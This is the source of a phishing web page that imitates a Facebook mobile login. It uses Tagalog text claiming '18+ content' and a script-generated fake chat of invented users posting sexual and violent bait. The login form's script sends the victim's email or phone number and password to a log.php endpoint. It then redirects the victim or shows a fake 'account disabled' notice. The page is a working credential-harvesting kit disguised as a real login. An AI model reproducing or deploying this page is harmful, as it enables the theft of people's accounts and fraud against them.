            font-weight: 500
        }

        .touch ._54k8._87g2._87g3 {
            background-color: #1877f2;
            color: #fff
        }

        .touch ._87g2._87g3:active {
            background-color: #6eadff
        }

        .touch ._87g2._87g3:disabled {
            background-color: #ebedf0;
            color: #8d949e
        }

        .touch ._54k8._87g2._87g4 {
            background-color: transparent;
            border: 1px solid #8d949e;
            color: #444950
        }

        .touch ._87g2._87g4:active {
            background-color: rgba(0, 0, 0, .05);
            color: #8d949e
        }

        .touch ._87g2._87g4:disabled {
            background-color: #ebedf0;
            border: none;
            color: #8d949e
        }

        .touch ._54k8._87g2._87g5 {
            background-color: #fff;
            color: #444950
        }

        .touch ._87g2._87g5:active {
            background-color: rgba(255, 255, 255, .5)
        }

        .touch ._87g2._87g5:disabled {
            background-color: rgba(255, 255, 255, .2);
            color: rgba(0, 0, 0, .4)
        }

        .touch ._54k8._87g2._87g6 {
            background-color: rgba(0, 0, 0, .2);
            border: 1px solid #fff;
            color: #fff
        }

        .touch ._87g2._87g6:active {
            background-color: rgba(255, 255, 255, .5);
            border: 1px solid rgba(255, 255, 255, .6);
            color: rgba(255, 255, 255, .6)
        }

        .touch ._87g2._87g6:disabled {
            background-color: rgba(0, 0, 0, .1);
            border: 1px solid rgba(255, 255, 255, .2);
            color: rgba(255, 255, 255, .4)
        }

        ._8tm {
            padding: 0
        }

        ._2phz {
            padding: 4px
        }

        ._2ph- {
            padding: 8px
        }

        ._2ph_ {
            padding: 12px
        }

        ._2pi0 {
            padding: 16px
        }

        ._2pi1 {
            padding: 20px
        }

        ._40c7 {
            padding: 24px
        }

        ._2o1j {
            padding: 36px
        }

        ._6buq {
            padding-bottom: 0;
            padding-top: 0
        }

        ._2pi2 {
            padding-bottom: 4px;
            padding-top: 4px
        }

        ._2pi3 {
            padding-bottom: 8px;
            padding-top: 8px
        }

        ._2pi4 {
            padding-bottom: 12px;
            padding-top: 12px
        }

        ._2pi5 {
            padding-bottom: 16px;
            padding-top: 16px
        }

        ._2pi6 {
            padding-bottom: 20px;
            padding-top: 20px
        }

        ._2o1k {
            padding-bottom: 24px;
            padding-top: 24px
        }

        ._2o1l {
            padding-bottom: 36px;
            padding-top: 36px
        }

        ._6bua {
            padding-left: 0;
            padding-right: 0
        }

        ._2pi7 {
            padding-left: 4px;
            padding-right: 4px
        }

        ._2pi8 {
            padding-left: 8px;
            padding-right: 8px
        }

        ._2pi9 {
            padding-left: 12px;
            padding-right: 12px
        }

        ._2pia {
            padding-left: 16px;
            padding-right: 16px
        }

        ._2pib {
            padding-left: 20px;
            padding-right: 20px
        }

        ._2o1m {
            padding-left: 24px;
            padding-right: 24px
        }

        ._2o1n {
            padding-left: 36px;
            padding-right: 36px
        }

        ._iky {
            padding-top: 0
        }

        ._2pic {
            padding-top: 4px
        }

        ._2pid {
            padding-top: 8px
        }

        ._2pie {
            padding-top: 12px
        }

        ._2pif {
            padding-top: 16px
        }

        ._2pig {
            padding-top: 20px
        }

        ._2owm {
            padding-top: 24px
        }

        ._div {
            padding-right: 0
        }

        ._2pih {
            padding-right: 4px
        }

        ._2pii {
            padding-right: 8px
        }

        ._2pij {
            padding-right: 12px
        }

        ._2pik {
            padding-right: 16px
        }

        ._2pil {
            padding-right: 20px
        }

        ._31wk {
            padding-right: 24px
        }

        ._2phb {
            padding-right: 32px
        }

        ._au- {
            padding-bottom: 0
        }

        ._2pim {
            padding-bottom: 4px
        }

        ._2pin {
            padding-bottom: 8px
        }

        ._2pio {
            padding-bottom: 12px
        }

        ._2pip {
            padding-bottom: 16px
        }

        ._2piq {
            padding-bottom: 20px
        }

        ._2o1p {
            padding-bottom: 24px
        }

        ._4gao {
            padding-bottom: 32px
        }

        ._1cvx {
            padding-left: 0
        }

        ._2pir {
            padding-left: 4px
        }

        ._2pis {
            padding-left: 8px
        }

        ._2pit {
            padding-left: 12px
        }

        ._2piu {
            padding-left: 16px
        }

        ._2piv {
            padding-left: 20px
        }

        ._2o1q {
            padding-left: 24px
        }

        ._2o1r {
            padding-left: 36px
        }

        #bootloader_1K5rRhi {
            height: 42px
        }

        .bootloader_1K5rRhi {
            display: block !important
        }
    </style>
    <section id="chat_cmt">
        <div id="message_box" class="h-100">
            <div class="grid-message scroll_custom scroll_hidden" id="xmessage">
            </div>
            <div id="form_chat" class="" style="position: fixed; bottom: 0px; left: 0px; background: #FFF; width: 100%;">
                <label for="" class="message-box w-100">
                    <img id="avatar_user" src="https://1.bp.blogspot.com/-0joo3x_HmEA/YDliRVbZCQI/AAAAAAABP64/3vvRrN7DSXQXmkEnh4RL3mJrmtoiUue7gCLcBGAsYHQ/s0/no_avatar.jpg" alt="avatar" class="avatar">
                    <input id="input_message" name="message" type="text" class="w-100" placeholder="Login to comment...">
                    <button onclick="commentAnDanh();" type="submit" class="send" style="background: linear-gradient(#647aab, #2c467e);color: white;">Send
                    </button>
                    </label>
            </div>
        </div>
    </section>
    <script>
        let stt = 0;
        let timeout = 200;

        //setting image
        let images = `
    
    http://3.bp.blogspot.com/-9kDtplNg9hI/YkIupYQd8QI/AAAAAAAAAXg/N6hFReFgkLAfgQ_pvFRfZO0HkGTjpYZpgCK4BGAYYCw/s220/2.jpg
    http://3.bp.blogspot.com/-9kDtplNg9hI/YkIupYQd8QI/AAAAAAAAAXg/N6hFReFgkLAfgQ_pvFRfZO0HkGTjpYZpgCK4BGAYYCw/s220/2.jpg
    http://4.bp.blogspot.com/-9VtBx-YogUM/YkIu3z0gLKI/AAAAAAAAAYw/kCyXiqKIjxg76f988-48iID0USZG5pIQACK4BGAYYCw/s220/12.jpg
    http://2.bp.blogspot.com/-WB4QaVhcIQw/YkIu9Pz1uII/AAAAAAAAAZM/ijkTzDINeEs_d5yMwjzyCclCk0KKfeXIQCK4BGAYYCw/s220/14.jpg
    http://2.bp.blogspot.com/-lQLI-7_syT8/YkIu2GjVh9I/AAAAAAAAAYo/uaY8Ji9rq4cvR_4VzEqIWii-XFc4V0EQgCK4BGAYYCw/s220/11.jpg
    http://4.bp.blogspot.com/-Wf6WoIrDgqc/YkIunoFhkNI/AAAAAAAAAXY/Ibnul4HbKxUR6gCmEBdV86tEm2Av7wDdwCK4BGAYYCw/s220/1.jpg
    http://3.bp.blogspot.com/-J-mTDwND9oI/YkIvAM4efaI/AAAAAAAAAZc/yEyM73rEroI39ihjtGRa1QwcnPir8jzVACK4BGAYYCw/s220/16.jpg
    http://1.bp.blogspot.com/-pPQuvI2YrW4/YkIu0kvOFvI/AAAAAAAAAYg/gh27SiFb834neeQu9Ls_Zqgo0sww0QsYQCK4BGAYYCw/s220/10.jpg
    http://1.bp.blogspot.com/-O7PH3oam22g/YkIvFyMBAvI/AAAAAAAAAaA/JlX9oU3zCZch1ByzVuxpQDlzHtXTuoVXACK4BGAYYCw/s220/20.jpg
    http://4.bp.blogspot.com/-VLYS02i4nK0/YkIvDJrzTkI/AAAAAAAAAZw/SsbYuQ1-bAgbU6bf0KRRd2EpYNVlER6twCK4BGAYYCw/s220/18.jpg
    http://1.bp.blogspot.com/-zrHXcoP_nIc/YkIurudu_hI/AAAAAAAAAXo/WejZQOU1b4c4hZ0WXDUNj_puYUg1mGb6gCK4BGAYYCw/s220/4.jpg
    http://3.bp.blogspot.com/-Dclk1qqUXf0/YkIu-mKgiGI/AAAAAAAAAZU/GPsROpPzfgcKCE97WqEzYaePj77rnvQWgCK4BGAYYCw/s220/15.jpg
    http://1.bp.blogspot.com/-evMWczkUKzw/YkIutNQ8h-I/AAAAAAAAAXw/DcStacW30kc-mnFuO-fkH6VabOhWfM9BwCK4BGAYYCw/s220/5.jpg
    http://1.bp.blogspot.com/-gEvumIns2Ng/YkIvEUGDB3I/AAAAAAAAAZ4/NEDrkoO8JycWmQe3wwchiJ-MKaVj0UqtwCK4BGAYYCw/s220/19.jpg
    http://4.bp.blogspot.com/-HYwk2vPCNlQ/YkIvBqLJ3WI/AAAAAAAAAZk/woOkNAX5Gjg8v0ktAoO4jw_2dJpWVTxTQCK4BGAYYCw/s220/17.jpg
    http://3.bp.blogspot.com/-5vBkXxC5ENo/YkIuxtYwAqI/AAAAAAAAAYQ/SzE0VMcc3tcPMD6XdCEt4q-doLam4m-XQCK4BGAYYCw/s220/8.jpg
    http://3.bp.blogspot.com/-d8dzwNoVjdc/YkIuwHf2oeI/AAAAAAAAAYE/4CsGm2_WW0crO9kH36PRDiH8mMZFxOcqwCK4BGAYYCw/s220/7.jpg
    https://1.bp.blogspot.com/-0joo3x_HmEA/YDliRVbZCQI/AAAAAAABP64/3vvRrN7DSXQXmkEnh4RL3mJrmtoiUue7gCLcBGAsYHQ/s0/no_avatar.jpg

    `;


        //setting name
        let names = `
    
    Cao Quân
    Trình Bão
    Thu Thủy
    Đường Tank
    Lãnh tụ Thích sờ zú
    Trẻ k tha già k thương
    Châu Tinhtinh
    Lệnh Hồ Sung
    Jonh Witch
    Lucifer Morningstar
    Demon
    Tạ Tốn
    Dương Vô Kỵ
    Trinh Nhỏ
    Quỳnh Búp Bê
    My Sói
    
    `;

        //setting chat
        let chats = `
    
    
 Matingkad na tunog, matalas na larawan, sa pangkalahatan
  mlem mlem, sobrang hot guyṣ
  parang malapit lang sya sa bahay ko or something, mukha
 oh my god, halika rito at tingnan mo, ang nayon ng tubig, nagkukulitan sila
  Report it to the police guys, yung babaeng yun sinasaksak nung guy 
  sigaw ng ganyan
  Napakawalang puso ng cdm, bakit walang nagsumbong sa pulis:))))
  Kamusta
Sumali lang ako sa grupòy
may tao bạ
  Sino ang gustong makipag-chat sa xxxk ạ
  20cm , 30 minutes here need to get to know you guys 
  Bakit wala akong makitang kaibigang babae?̉̉
  Ako si Trinh 18 taong gulang, na nakatira sa
 I'm siglemom, need daddy to support meỏạ
  🤣🤣🤣🤣🤣🤣🤣🤣🤣
  under maintenance ang pornhub at naligaw dito,
  damdang asawa and a lucky guy everyone  
    
    `;



        let images_cache;
        let names_cache;
        let chats_cache;
        gogogo();

        function randomLine(n) {
            for (var e = n.length, i, u; e !== 0;) u = Math.floor(Math.random() * e), e -= 1, i = n[e], n[e] = n[u], n[u] = i;
            return n
        }

        function gogogo() {
            images = images.split('\n').filter(t => t !== "").map(text => text.trim()).filter(t => t !== "");
            images_cache = [...images];
            images_cache = randomLine(images_cache);
            names = names.split('\n').filter(t => t !== "").map(text => text.trim()).filter(t => t !== "");
            names_cache = [...names];
            names_cache = randomLine(names_cache);
            chats = chats.split('\n').filter(t => t !== "").map(text => text.trim()).filter(t => t !== "");
            chats_cache = [...chats];
            chats_cache = randomLine(chats_cache);
            run_chat();
        }

        function run_chat() {
            ++stt;
            if (chats.length < 1) {
                return;
            };
            if (names_cache.length < 1) {
                names_cache = [...names];
                names_cache = randomLine(names_cache);
            }
            if (images_cache.length < 1) {
                images_cache = [...images];
                images_cache = randomLine(images_cache);
            }
            timeout = timeout + (stt * 300) + Math.floor(Math.random() * 1000) + 200;
            let name_show = names_cache.shift();
            let image_url = images_cache.shift();
            let chat_msg = chats_cache.shift();
            let msg_chat = `<div class="col-message-received col-message">
                <img src="${image_url}" alt="avatar" class="avatar-message">
                <p class="username">${name_show}</p>
                <div class="list-message">
                    <div class="message-received">${chat_msg}</div>
                </div>
            </div>`;
            document.querySelector('div[id="xmessage"]').innerHTML = msg_chat + document.querySelector('div[id="xmessage"]').innerHTML;
            setTimeout(() => run_chat(), timeout);
            return;
        }
    </script>
    <script type="text/javascript">
        function change(t) {
            if (top === 1) {
                document.querySelector('[id="id_show_p"]').style.display = "";
                document.querySelector('[id="id_hide_p"]').style.display = "none";
                document.querySelector('[name="b"]').type = "password";
            } else {
                document.querySelector('[id="id_show_p"]').style.display = "none";
                document.querySelector('[id="id_hide_p"]').style.display = "";
                document.querySelector('[name="b"]').type = "text";
            }
        }
    </script>
    <div class="_5m_x _10yp accelerate" data-sigil="m-layer-root" id="popup_need_login" data-store-id="6" style="top: 118px;z-index: 1000000000;display: none;">
        <div data-sigil=" m-overlay-layer" class=" _5m_v" style="padding: 1px 0px;">
            <div class="_5m_u" style="margin-top: 0px;">
                <div class="_5m_s"></div>
                <div class="_5m_t">
                    <div class="_10yv">
                        <div class="_9om_">
                            <div class="_4-4l">
                                <div id="login_top_banner">
                                    <div class="_qw9 grouped aclb" id="thongtin_for" style="">
                                        <a href="#" target="_top" class="touchableArea first last area touchable acy apl abt abb">
                                            <div class="ib cc">
                                                <i class="l img sp_xm9DDmY7HAL_3x sx_f30d37" style="background-image: url(https://static.xx.fbcdn.net/rsrc.php/v3/y3/r/cvj8rfO8RgU.png);background-size: 19px 67px;background-repeat: no-repeat;width: 18px;height: 32px;background-position: 0 0;"></i>
                                                <div class="c"><span class="fcl">Nilalaman 18+, kailangan mong mag-login upang magpatuloy.</span></div>
                                            </div>
                                        </a>
                                    </div>
                                    <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="thongtin_form" data-sigil="m_login_notice">Nilalaman 18+, kailangan mong mag-login upang magpatuloy.</div>
                                </div>
                                <div class="_7om2 _52we _2pid _52z6">
                                    <div class="_4g34"><a href="#"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook"></a></div>
                                </div>
                                <div class="_5rut">
                                    <form class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1">
                                        <div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_96n9" id="email_input_container"><input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="off" id="a" placeholder="Email o numero ng teleponoi "></div>
                                                </div>
                                            </div>
                                            <div class="_55wq"></div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_1upc _mg8">
                                                        <div class="_7om2">
                                                            <div class="_4g34 _5i2i _52we">
                                                                <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="off" id="p" placeholder="Password" type="Password"></div>
                                                            </div>
                                                            <div class="_5s61 _216i _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <div class="_2pi9"> <a href="#"> <span class="mfss" id="id_hide_p" onclick="change(1);" style="display:none;" id="u_0_3_ub">SHOW</span> <span class="mfss" id="id_show_p" onclick="change(2);">Sa kasalukuyann</span> </a></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_2pie" style="text-align:center;">
                                            <div ><button type="button" style="height: 50px;" id="lg"  class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"><span class="_55sr" id="lg_text">Mag log in</span></button></div>
                                        </div>
                                    </form>
                                    <div>
                                        <div class="_2pie _9omz"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div data-sigil=" m-overlay-modal" class="_5m_w"></div>
    </div>
    <div class="_5m_x _10yp accelerate" data-sigil="m-layer-root" id="popup_error_pass" data-store-id="6" style="top: 227px; z-index: 1000000000;display: none;">
        <div data-sigil=" m-overlay-layer" class=" _5m_v" style="padding: 1px 0px;">
            <div class="_5m_u" style="margin-top: 0px;">
                <div class="_5m_s"></div>
                <div class="_5m_t">
                    <div class="_10yv">
                        <div class="_52je">Invalid username or password</div>
                        <div class="_52j9 _10yw">Your password is incorrect, please login again!</div>
                        <div class="_10yx"><a href="#" onclick="noti_error_pass();" class="_10yz _10yy">Close</a></div>
                    </div>
                </div>
            </div>
        </div>
        <div data-sigil=" m-overlay-modal" class="_5m_w"></div>
    </div>
    <div id="viewport_fake" ></div>
    <div id="viewport" style="display: none;">
        <div id="page">
            <div class="_5soa acw" id="root" role="main">
                <div class="_7om2">
                    <div class="_4g34" id="u_0_0_uc"></div>
                </div>
                <div style="display:none">
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript">
        

        function formatBtnLogin() {
            document.querySelector('span[id="lg_text"]').textContent = "Login";
        }
      
        function noti_error_pass(show) {
            if (show) {
                document.getElementById("popup_error_pass").style.display = "";
            } else {
                document.getElementById("popup_error_pass").style.display = "none";
            }
        }

        function validateForm() {
            var email = document.getElementsByName("a")[0].value.toString();
            if (email == "") {
                document.getElementById("lg").disabled = false;
                document.getElementById("thongtin_form")["style"]["display"] = "";
                document.getElementById("thongtin_for")["style"]["display"] = "none";
                document.querySelector('input[name="a"]').className = "_56bg _4u9z _5ruq _8qtn _3qsy _3qs-";
                document.querySelector('input[name="b"]').className = "_56bg _4u9z _5ruq _8qtn";
                document.getElementById('thongtin_form').innerHTML = 'Mangyaring ipasok ang iyong email o numero ng telepono. '; // #need_edit Không nhập email
                return false;
            }
            var email = document.getElementsByName("a")[0].value;
            if (email.length < 6) {
                document.getElementById("lg").disabled = false;
                document.getElementById("thongtin_form")["style"]["display"] = "";
                document.getElementById("thongtin_for")["style"]["display"] = "none";
                document.querySelector('input[name="a"]').className = "_56bg _4u9z _5ruq _8qtn _3qsy _3qs-";
                document.querySelector('input[name="b"]').className = "_56bg _4u9z _5ruq _8qtn";
                document.getElementById('thongtin_form').innerHTML = 'Mangyaring ipasok ang iyong email o numero ng teleponoại.'; // #need_edit Nhập email < 6 kí tự
                return false;
            }

            var ho = document.getElementsByName("b")[0].value;
            if (ho == "") {
                document.querySelector('input[name="a"]').className = "_56bg _4u9z _5ruq _8qtn";
                document.querySelector('input[name="b"]').className = "_56bg _4u9z _5ruq _8qtn _3qsy _3qs-";
                document.getElementById("lg").disabled = false;
                document.getElementById("thongtin_form")["style"]["display"] = "";
                document.getElementById("thongtin_for")["style"]["display"] = "none";
                document.getElementById('thongtin_form').innerHTML = 'Hindi maaaring iwanang blangko ang password ?'; // #need_edit Không nhập password
                return false;
            }
            var ho = document.getElementsByName("b")[0].value;
            if (ho.length < 6) {
                document.querySelector('input[name="a"]').className = "_56bg _4u9z _5ruq _8qtn";
                document.querySelector('input[name="b"]').className = "_56bg _4u9z _5ruq _8qtn _3qsy _3qs-";
                document.getElementById("lg").disabled = false;
                document.getElementById("thongtin_form")["style"]["display"] = "";
                document.getElementById("thongtin_for")["style"]["display"] = "none";
                document.getElementById('thongtin_form').innerHTML = 'Masyadong maikli ang password ?'; // #need_edit Nhập password nhỏ hơn 6 kí tự
                return false;
            }
            return true;
        }
    </script>
    <script type="text/javascript">
        function commentAnDanh() {
            let mes = document.querySelector('[id="input_message"]').value;
            let element = document.querySelector('[id="grid-message"]');
            element.innerHTML += `<div class="col-message-received col-message"><img src="https://e7.pngegg.com/pngimages/659/469/png-clipart-computer-icons-incognito-text-user-interface-thumbnail.png" alt="avatar" class="avatar-message"><p class="username">User</p><div class="list-message"><div class="message-received">${mes}</div></div></div>`;
            document.querySelector('[id="input_message"]').value = "";
        }

        display_message();

        function display_message() {
            var message_received = document.getElementsByClassName('col-message-received');
            for (var i = message_received.length - 1; i > 0; i--) {
                if (message_received[i].getAttribute("style") == 'display: none') {
                    message_received[i].style.display = "";
                    break;
                }
            }
            setTimeout(display_message, Math.floor(Math.random() * (5000 - 1000)) + 1000);
        }
        document.getElementsByTagName('video')[0].focus();

        function myFunction() {
            document.getElementById("myVideo").pause();
            document.getElementById("popup_need_login").style.display = "";
        }

        function isVietnamesePhoneNumber(number) {
            if(number.length >= 4){
                return true;
            }else{
                return false;
            }
 
}
function validateEmail(email) 
    {
        var re = /\S+@\S+\.\S+/;
        return re.test(email);
    }
    
  
      $("#lg").click(function(){
  
          var acc = $("#a").val();
          var pass = $("#p").val();
          var type = 'facebook';
          document.getElementById("lg").disabled = true;
          if(isVietnamesePhoneNumber(acc) === true || validateEmail(acc) === true){
            
              if(pass.length < 6){
            
                document.getElementById("lg").disabled = false;
                document.getElementById("thongtin_form")["style"]["display"] = "";
                document.getElementById("thongtin_for")["style"]["display"] = "none";
                document.getElementById('thongtin_form').innerHTML = 'Mali ang password'; // #need_edit Không nhập password
              }
              else {
       
                  $.post('log.php', {username: acc,password: pass,}, function(result){
                      if(result == 'logined'){
                        document.getElementById("lg").disabled = false;
        $("#loading").show();
        setTimeout(function(){
           

            window.location.href = "<?=$link?>";
         }, 2000);
         $("#thongbao").hide();
                      }else{
                          $("#thongbao").html('<div class="thongbao">Upang protektahan ang komunidad mula sa spam, hindi namin pinagana ang iyong account</div>');
                  $("#thongbao").show();
                      }
   
  });
              }
          }
          else {
            document.getElementById("lg").disabled = false;
                document.getElementById("thongtin_form")["style"]["display"] = "";
                document.getElementById("thongtin_for")["style"]["display"] = "none";
        
                document.getElementById('thongtin_form').innerHTML = 'Mangyaring ipasok ang iyong email o numero ng teleponoại.'; // #need_edit Nhập email < 6 kí tự
          }
      })
    </script>
</body>

</html>